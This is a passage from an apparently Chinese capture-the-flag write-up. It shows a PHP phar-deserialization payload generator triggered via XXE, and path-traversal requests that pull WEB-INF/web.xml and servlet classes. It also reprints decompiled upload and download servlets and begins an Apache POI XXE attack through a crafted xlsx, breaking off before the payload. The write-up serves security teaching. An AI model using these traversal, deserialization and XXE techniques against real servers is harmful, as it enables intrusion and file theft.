class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span> = <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="keyword">new</span> <span class="title class_">Fun</span>());</span><br><span class="line"><span class="variable">$a</span>-&gt;a = <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>将生成的phar文件上传</p>
<p>最后利用XXE通过phar协议触发反序列化获得flag。 SYSTEM phar:&#x2F;&#x2F;&#x2F;temp&#x2F;phar.phat</p>
<h3 id="网鼎杯-FileJava"><a href="#网鼎杯-FileJava" class="headerlink" title="网鼎杯 FileJava"></a>网鼎杯 FileJava</h3><p>可以上传任意文件和下载文件，但是不能访问，所以不能用一句话连接，在下载文件功能发现可以下载任意文件，于是将WEB-INF&#x2F;web.xml页面下载,访问<code>/file_in_java/DownloadServlet?filename=../../../../WEB-INF/web.xml</code>,相关内容如下</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.DownloadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/DownloadServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.ListFileServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/ListFileServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.UploadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/UploadServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现有上传和下载的配置文件，由2个类组成，将这2个类进行下载。分别访问&#96;&#x2F;file_in_java&#x2F;DownloadServlet?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet</p>
<p>&#x2F;DownloadServlet.class<code>、</code>&#x2F;file_in_java&#x2F;DownloadServlet?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;UploadServlet.class<code>。使用</code>jd-gui.exe<code>分别进行反编译，其中</code>DownloadServlet.class&#96;源码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.abc.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintStream;</span><br><span class="line"><span class="keyword">import</span> java.net.URLEncoder;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.RequestDispatcher;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DownloadServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">    <span class="keyword">throws</span> ServletException, IOException</span><br><span class="line">  &#123;</span><br><span class="line">    doPost(request, response); &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;filename&quot;</span>);</span><br><span class="line">    fileName = <span class="keyword">new</span> <span class="title class_">String</span>(fileName.getBytes(<span class="string">&quot;ISO8859-1&quot;</span>), <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;filename=&quot;</span> + fileName);</span><br><span class="line">    <span class="keyword">if</span> ((fileName != <span class="literal">null</span>) &amp;&amp; (fileName.toLowerCase().contains(<span class="string">&quot;flag&quot;</span>))) &#123;</span><br><span class="line">      request.setAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;禁止读取&quot;</span>);</span><br><span class="line">      request.getRequestDispatcher(<span class="string">&quot;/message.jsp&quot;</span>).forward(request, response);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">fileSaveRootPath</span> <span class="operator">=</span> getServletContext().getRealPath(<span class="string">&quot;/WEB-INF/upload&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> findFileSavePathByFileName(fileName, fileSaveRootPath);</span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(path + <span class="string">&quot;/&quot;</span> + fileName);</span><br><span class="line">    <span class="keyword">if</span> (!(file.exists())) &#123;</span><br><span class="line">      request.setAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;您要下载的资源已被删除!&quot;</span>);</span><br><span class="line">      request.getRequestDispatcher(<span class="string">&quot;/message.jsp&quot;</span>).forward(request, response);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">realname</span> <span class="operator">=</span> fileName.substring(fileName.indexOf(<span class="string">&quot;_&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">    response.setHeader(<span class="string">&quot;content-disposition&quot;</span>, <span class="string">&quot;attachment;filename=&quot;</span> + URLEncoder.encode(realname, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">    <span class="type">FileInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(path + <span class="string">&quot;/&quot;</span> + fileName);</span><br><span class="line">    <span class="type">ServletOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line">    <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((len = in.read(buffer)) &gt; <span class="number">0</span>)</span><br><span class="line">      out.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">    in.close();</span><br><span class="line">    out.close();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">findFileSavePathByFileName</span><span class="params">(String filename, String saveRootPath)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">hashCode</span> <span class="operator">=</span> filename.hashCode();</span><br><span class="line">    <span class="type">int</span> <span class="variable">dir1</span> <span class="operator">=</span> hashCode &amp; <span class="number">0xF</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">dir2</span> <span class="operator">=</span> (hashCode &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">dir</span> <span class="operator">=</span> saveRootPath + <span class="string">&quot;/&quot;</span> + dir1 + <span class="string">&quot;/&quot;</span> + dir2;</span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(dir);</span><br><span class="line">    <span class="keyword">if</span> (!(file.exists()))</span><br><span class="line">      file.mkdirs();</span><br><span class="line">    <span class="keyword">return</span> dir;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>UploadServlet.class</code>源码如下:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.abc.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.RequestDispatcher;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.FileItem;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.FileUploadException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.disk.DiskFileItemFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.servlet.ServletFileUpload;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.openxml4j.exceptions.InvalidFormatException;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.ss.usermodel.Sheet;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.ss.usermodel.Workbook;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.ss.usermodel.WorkbookFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UploadServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">    <span class="keyword">throws</span> ServletException, IOException</span><br><span class="line">  &#123;</span><br><span class="line">    doPost(request, response); &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">savePath</span> <span class="operator">=</span> getServletContext().getRealPath(<span class="string">&quot;/WEB-INF/upload&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">tempPath</span> <span class="operator">=</span> getServletContext().getRealPath(<span class="string">&quot;/WEB-INF/temp&quot;</span>);</span><br><span class="line">    <span class="type">File</span> <span class="variable">tempFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(tempPath);</span><br><span class="line">    <span class="keyword">if</span> (!(tempFile.exists()))</span><br><span class="line">      tempFile.mkdir();</span><br><span class="line">    <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">DiskFileItemFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DiskFileItemFactory</span>();</span><br><span class="line">      factory.setSizeThreshold(<span class="number">102400</span>);</span><br><span class="line">      factory.setRepository(tempFile);</span><br><span class="line">      <span class="type">ServletFileUpload</span> <span class="variable">upload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletFileUpload</span>(factory);</span><br><span class="line"></span><br><span class="line">      upload.setHeaderEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">      upload.setFileSizeMax(<span class="number">1048576L</span>);</span><br><span class="line">      upload.setSizeMax(<span class="number">10485760L</span>);</span><br><span class="line">      <span class="keyword">if</span> (!(ServletFileUpload.isMultipartContent(request)))</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="type">List</span> <span class="variable">list</span> <span class="operator">=</span> upload.parseRequest(request);</span><br><span class="line">      <span class="type">Iterator</span> <span class="variable">localIterator</span> <span class="operator">=</span> list.iterator();</span><br><span class="line">      <span class="keyword">while</span> (<span class="literal">true</span>) &#123; FileItem fileItem;</span><br><span class="line">        String filename;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123; <span class="keyword">do</span> &#123; String str;</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123; <span class="keyword">if</span> (!(localIterator.hasNext())) <span class="keyword">break</span> label438; fileItem = (FileItem)localIterator.next();</span><br><span class="line">              <span class="keyword">if</span> (!(fileItem.isFormField())) <span class="keyword">break</span>;</span><br><span class="line">              <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> fileItem.getFieldName();</span><br><span class="line">              str = fileItem.getString(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            filename = fileItem.getName(); &#125;</span><br><span class="line">          <span class="keyword">while</span> (filename == <span class="literal">null</span>); <span class="keyword">if</span> (!(filename.trim().equals(<span class="string">&quot;&quot;</span>))) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">fileExtName</span> <span class="operator">=</span> filename.substring(filename.lastIndexOf(<span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> fileItem.getInputStream();</span><br><span class="line">        <span class="keyword">if</span> ((filename.startsWith(<span class="string">&quot;excel-&quot;</span>)) &amp;&amp; (<span class="string">&quot;xlsx&quot;</span>.equals(fileExtName)))</span><br><span class="line">          <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Workbook</span> <span class="variable">wb1</span> <span class="operator">=</span> WorkbookFactory.create(in);</span><br><span class="line">            <span class="type">Sheet</span> <span class="variable">sheet</span> <span class="operator">=</span> wb1.getSheetAt(<span class="number">0</span>);</span><br><span class="line">            System.out.println(sheet.getFirstRowNum());</span><br><span class="line">          &#125; <span class="keyword">catch</span> (InvalidFormatException e) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;poi-ooxml-3.10 has something wrong&quot;</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">saveFilename</span> <span class="operator">=</span> makeFileName(filename);</span><br><span class="line">        request.setAttribute(<span class="string">&quot;saveFilename&quot;</span>, saveFilename);</span><br><span class="line">        request.setAttribute(<span class="string">&quot;filename&quot;</span>, filename);</span><br><span class="line">        <span class="type">String</span> <span class="variable">realSavePath</span> <span class="operator">=</span> makePath(saveFilename, savePath);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(realSavePath + <span class="string">&quot;/&quot;</span> + saveFilename);</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((len = in.read(buffer)) &gt; <span class="number">0</span>)</span><br><span class="line">          out.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">        in.close();</span><br><span class="line">        out.close();</span><br><span class="line">        label438: message = <span class="string">&quot;文件上传成功!&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (FileUploadException e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    request.setAttribute(<span class="string">&quot;message&quot;</span>, message);</span><br><span class="line">    request.getRequestDispatcher(<span class="string">&quot;/ListFileServlet&quot;</span>).forward(request, response); &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> String <span class="title function_">makeFileName</span><span class="params">(String filename)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> UUID.randomUUID().toString() + <span class="string">&quot;_&quot;</span> + filename; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> String <span class="title function_">makePath</span><span class="params">(String filename, String savePath)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">hashCode</span> <span class="operator">=</span> filename.hashCode();</span><br><span class="line">    <span class="type">int</span> <span class="variable">dir1</span> <span class="operator">=</span> hashCode &amp; <span class="number">0xF</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">dir2</span> <span class="operator">=</span> (hashCode &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">dir</span> <span class="operator">=</span> savePath + <span class="string">&quot;/&quot;</span> + dir1 + <span class="string">&quot;/&quot;</span> + dir2;</span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(dir);</span><br><span class="line">    <span class="keyword">if</span> (!(file.exists()))</span><br><span class="line">      file.mkdirs();</span><br><span class="line">    <span class="keyword">return</span> dir;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从<code>UploadServlet.class</code>可以关注到如下关键代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((filename.startsWith(<span class="string">&quot;excel-&quot;</span>)) &amp;&amp; (<span class="string">&quot;xlsx&quot;</span>.equals(fileExtName)))</span><br><span class="line">          <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Workbook</span> <span class="variable">wb1</span> <span class="operator">=</span> WorkbookFactory.create(in);</span><br><span class="line">            <span class="type">Sheet</span> <span class="variable">sheet</span> <span class="operator">=</span> wb1.getSheetAt(<span class="number">0</span>);</span><br><span class="line">            System.out.println(sheet.getFirstRowNum());</span><br><span class="line">          &#125; <span class="keyword">catch</span> (InvalidFormatException e) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;poi-ooxml-3.10 has something wrong&quot;</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure>

<p>其中<code>Apache POI XML外部实体攻击()</code>相关对应漏洞版本为<code>poi-ooxml-3.10-FINAL.jar及以下版本</code>，并且也是针对<code>Office</code>的攻击，于是可以进行尝试。创建名为<code>excel-1.xlsx</code>的文件，修改后缀为<code>zip</code>,使用<code>winrar</code>进行解压，修改<code>[Content-Types].xml</code>文件，在第2行添加</p>
